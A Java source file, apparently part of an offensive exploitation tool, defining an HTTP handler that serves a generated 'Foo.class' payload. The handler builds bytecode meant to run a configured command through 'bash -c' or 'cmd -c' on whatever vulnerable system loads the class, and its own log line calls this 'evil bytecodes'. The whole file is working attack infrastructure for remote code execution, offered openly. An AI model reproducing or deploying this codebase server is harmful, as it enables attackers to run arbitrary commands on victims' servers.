package server.http.handler;

import asm.ExecObjectFactory;
import asm.context.ASMContext;
import cli.Config;
import com.sun.net.httpserver.HttpExchange;

import java.io.IOException;
import java.io.OutputStream;
import java.time.LocalTime;

public class ExecHandler implements CodeBase {

    public ExecHandler() {
        System.out.println("[HTTP] register codebase /Foo.class");
    }

    @Override
    public void handle(HttpExchange exchange) throws IOException {
        String method = exchange.getRequestMethod();
        System.out.printf("[HTTP] %s %s - /Foo.class\n", LocalTime.now().toString(), method);

        byte[] bytes = new ASMContext(new ExecObjectFactory()).executeOF();
        System.out.printf("[HTTP] compiled evil bytecodes Foo.class >> execute command [{bash -c} or {cmd -c} '%s']\n", Config.getGlobalInstance().command);
        exchange.sendResponseHeaders(200, 0);
        OutputStream out = exchange.getResponseBody();
        out.write(bytes);
        out.flush();
        out.close();
    }

}
